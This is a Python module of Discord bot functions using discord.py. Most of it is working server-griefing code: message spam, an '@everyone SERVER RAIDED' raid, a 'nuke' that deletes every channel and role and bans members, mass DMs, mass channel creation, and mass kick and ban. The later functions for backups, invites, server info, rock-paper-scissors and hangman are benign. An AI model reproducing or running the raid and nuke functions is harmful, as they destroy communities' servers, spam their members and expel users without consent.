import discord
import asyncio
import json
import io
import random

async def spam_messages(channel, count, content):
    for _ in range(count):
        await channel.send(content)
        await asyncio.sleep(0.5)

async def purge_messages(channel, limit):
    deleted = await channel.purge(limit=limit)
    await channel.send(f'Deleted {len(deleted)} message(s)')

async def raid_server(guild):
    for channel in guild.text_channels:
        await channel.send("@everyone SERVER RAIDED")
    await guild.text_channels[0].send("Raid completed")

async def nuke_server(guild, author_id, bot_id):
    results = []
    
    if guild.me.guild_permissions.manage_channels:
        for channel in guild.channels:
            try:
                await channel.delete()
                results.append(f"Deleted channel: {channel.name}")
            except:
                results.append(f"Failed to delete channel: {channel.name}")
    else:
        results.append("No permission to delete channels")

    if guild.me.guild_permissions.manage_roles:
        for role in guild.roles:
            if role.position < guild.me.top_role.position:
                try:
                    await role.delete()
                    results.append(f"Deleted role: {role.name}")
                except:
                    results.append(f"Failed to delete role: {role.name}")
    else:
        results.append("No permission to delete roles")

    if guild.me.guild_permissions.ban_members:
        for member in guild.members:
            if member.id not in [author_id, bot_id] and member.top_role < guild.me.top_role:
                try:
                    await member.ban(reason="Server nuke")
                    results.append(f"Banned member: {member.name}")
                except:
                    results.append(f"Failed to ban member: {member.name}")
    else:
        results.append("No permission to ban members")

    try:
        new_channel = await guild.create_text_channel('nuked')
        await new_channel.send("Server nuke attempted. Results:\n" + "\n".join(results))
    except:
        print("Failed to create new channel or send results")

    return results

async def mass_dm_members(guild, message):
    sent_count = 0
    failed_count = 0
    for member in guild.members:
        try:
            await member.send(message)
            sent_count += 1
        except:
            failed_count += 1
    return f"Mass DM completed. Sent to {sent_count} members. Failed for {failed_count} members."

async def create_multiple_channels(guild, count, name):
    created = 0
    for i in range(count):
        try:
            await guild.create_text_channel(f"{name}-{i+1}")
            created += 1
        except discord.Forbidden:
            return f"Created {created} channels before running out of permissions."
        except discord.HTTPException:
            return f"Created {created} channels before hitting a rate limit."
    return f"Successfully created {created} channels."

async def delete_all_channels(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
        except:
            pass
    return f"Deleted {deleted} channels."

async def kick_all_members(guild, author_id, bot_id):
    kicked = 0
    for member in guild.members:
        if member.id not in [author_id, bot_id] and member.top_role < guild.me.top_role:
            try:
                await member.kick(reason="Mass kick")
                kicked += 1
            except:
                pass
    return f"Kicked {kicked} members."

async def ban_all_members(guild, author_id, bot_id):
    banned = 0
    for member in guild.members:
        if member.id not in [author_id, bot_id] and member.top_role < guild.me.top_role:
            try:
                await member.ban(reason="Mass ban")
                banned += 1
            except:
                pass
    return f"Banned {banned} members."

async def send_server_info(ctx):
    guild = ctx.guild
    embed = discord.Embed(title=f"{guild.name} Server Information", color=discord.Color.blue())
    embed.add_field(name="Owner", value=guild.owner, inline=False)
    embed.add_field(name="Member Count", value=guild.member_count, inline=False)
    embed.add_field(name="Text Channels", value=len(guild.text_channels), inline=True)
    embed.add_field(name="Voice Channels", value=len(guild.voice_channels), inline=True)
    embed.add_field(name="Roles", value=len(guild.roles), inline=True)
    embed.add_field(name="Created At", value=guild.created_at.strftime("%Y-%m-%d %H:%M:%S"), inline=False)
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    await ctx.send(embed=embed)

async def create_backup(guild):
    backup = {
        "name": guild.name,
        "roles": [],
        "channels": []
    }
    
    for role in guild.roles:
        if role.name != "@everyone":
            backup["roles"].append({
                "name": role.name,
                "permissions": role.permissions.value,
                "color": role.color.value,
                "hoist": role.hoist,
                "mentionable": role.mentionable
            })
    
    for channel in guild.channels:
        if isinstance(channel, discord.TextChannel):
            backup["channels"].append({
                "name": channel.name,
                "type": "text",
                "category": channel.category.name if channel.category else None,
                "topic": channel.topic,
                "slowmode_delay": channel.slowmode_delay
            })
        elif isinstance(channel, discord.VoiceChannel):
            backup["channels"].append({
                "name": channel.name,
                "type": "voice",
                "category": channel.category.name if channel.category else None,
                "user_limit": channel.user_limit
            })
    
    return io.BytesIO(json.dumps(backup, indent=4).encode())

async def restore_backup(guild, backup_data):
    backup = json.loads(backup_data)
    
    await guild.edit(name=backup["name"])
    
    for role_data in backup["roles"]:
        await guild.create_role(name=role_data["name"], 
                                permissions=discord.Permissions(role_data["permissions"]),
                                color=discord.Color(role_data["color"]),
                                hoist=role_data["hoist"],
                                mentionable=role_data["mentionable"])
    
    categories = {}
    for channel_data in backup["channels"]:
        if channel_data["category"] and channel_data["category"] not in categories:
            categories[channel_data["category"]] = await guild.create_category(channel_data["category"])
        
        if channel_data["type"] == "text":
            channel = await guild.create_text_channel(channel_data["name"], 
                                                      category=categories.get(channel_data["category"]),
                                                      topic=channel_data["topic"],
                                                      slowmode_delay=channel_data["slowmode_delay"])
        elif channel_data["type"] == "voice":
            channel = await guild.create_voice_channel(channel_data["name"], 
                                                       category=categories.get(channel_data["category"]),
                                                       user_limit=channel_data["user_limit"])

async def generate_all_invites(guild):
    invites = {}
    for channel in guild.channels:
        if isinstance(channel, (discord.TextChannel, discord.VoiceChannel)):
            try:
                invite = await channel.create_invite(max_age=0, max_uses=0)
                invites[channel.name] = invite.url
            except discord.Forbidden:
                invites[channel.name] = "Could not create invite (no permission)"
    return invites

# Game-related functions
def determine_rps_winner(player_choice, bot_choice):
    if player_choice == bot_choice:
        return "It's a tie!"
    elif (player_choice == "rock" and bot_choice == "scissors") or \
         (player_choice == "paper" and bot_choice == "rock") or \
         (player_choice == "scissors" and bot_choice == "paper"):
        return "You win!"
    else:
        return "I win!"

def start_hangman():
    words = ["python", "programming", "computer", "algorithm", "database", "network", "software", "developer"]
    word = random.choice(words)
    hidden_word = ['_' for _ in word]
    attempts = 6
    return word, hidden_word, attempts

def guess_hangman(word, hidden_word, guess, attempts):
    if guess in word:
        for i in range(len(word)):
            if word[i] == guess:
                hidden_word[i] = guess
    else:
        attempts -= 1
    return hidden_word, attempts

